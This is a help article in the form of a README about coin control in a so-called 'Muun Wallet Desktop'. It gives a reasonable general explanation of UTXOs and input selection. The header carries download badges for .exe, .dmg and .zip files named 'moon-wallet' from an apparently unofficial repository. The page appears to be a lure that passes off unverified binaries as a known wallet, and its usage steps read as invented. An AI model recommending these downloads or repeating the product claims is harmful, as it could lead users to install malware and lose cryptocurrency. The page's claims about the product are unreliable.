[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Coin Control in Muun Wallet Desktop

Coin control is one of the desktop-only features in Muun Wallet that the mobile app does not offer. This article explains what it is, when it matters, and how to use it.

---

## What coin control is

In Bitcoin, your wallet balance is not a single number held in an account. It is a collection of individual outputs (UTXOs — Unspent Transaction Outputs) that together add up to your total balance. Each UTXO is associated with a transaction where you received funds, and it has its own history on the blockchain.

When you send Bitcoin, your wallet selects which UTXOs to use as inputs for the new transaction. Without coin control, the wallet makes this selection automatically — typically choosing the most efficient combination by size. With coin control, you choose which specific UTXOs to spend.

---

## Why coin control matters

**Privacy.** When you combine UTXOs from different sources in a single transaction, you link their histories together on the blockchain. An on-chain observer can see that the same entity controlled all the input UTXOs, which may reveal connections between payments you would prefer to keep separate. Coin control lets you avoid unintentional linkage by choosing inputs carefully.

**Bookkeeping.** If you keep funds from different purposes separate — business income, savings, personal spending — coin control lets you ensure that a transaction draws only from the intended pool. This makes accounting and record-keeping more accurate.

**Avoiding dust consolidation.** Wallets that automatically consolidate small UTXOs (dust) can inadvertently link coin histories and increase fees for future transactions. With coin control, you decide when and whether to consolidate.

**Fee efficiency.** Different UTXOs have different sizes on the blockchain. Large UTXOs create more efficient transactions (lower fee per satoshi sent) than many small UTXOs. Coin control lets you choose large, efficient inputs when fee minimization matters.

---

## How to use coin control in Muun Wallet Desktop

1. In Muun Wallet Desktop, begin a Send transaction as normal.
2. Before entering the amount, look for the coin control or UTXO selection option in the Send flow — usually accessible via an advanced options toggle or a dedicated "Select coins" button.
3. Muun displays your available UTXOs with their amounts and (where visible) origin transaction details.
4. Select the UTXOs you want to use as inputs for this transaction. The available balance updates to reflect only the selected UTXOs.
5. Enter the amount and destination as normal. Complete the send.

If the selected UTXOs exceed the send amount, Muun creates a change output that returns the excess to your wallet — this is standard Bitcoin transaction behaviour. The change output arrives as a new UTXO in your balance.

---

## Coin control vs. multi-account

Muun Wallet Desktop also supports multiple accounts within one install. Accounts are a higher-level separation — funds in different accounts do not share UTXOs and do not appear together in coin control. If you want firm, persistent separation between different pools of funds (e.g. business vs. personal, spending vs. savings), use separate accounts. Use coin control within an account when you want fine-grained transaction-level UTXO selection.

---

## Limitations

Coin control in Muun Wallet Desktop is designed for the most common use cases — selecting inputs and avoiding unintentional history linkage. It is not as granular as Sparrow Wallet's UTXO management, which includes labelling, freezing individual outputs, and detailed cluster analysis. If your privacy or coin management requirements are advanced, Sparrow remains the specialist tool for on-chain UTXO control. See [Muun vs Sparrow](muun-wallet-vs-sparrow-wallet.md) for the comparison.

---

## Related articles

- [Muun Wallet privacy](muun-wallet-privacy.md)
- [Muun Wallet fees explained](muun-wallet-fees-explained.md)
- [Muun Wallet vs Sparrow Wallet](muun-wallet-vs-sparrow-wallet.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
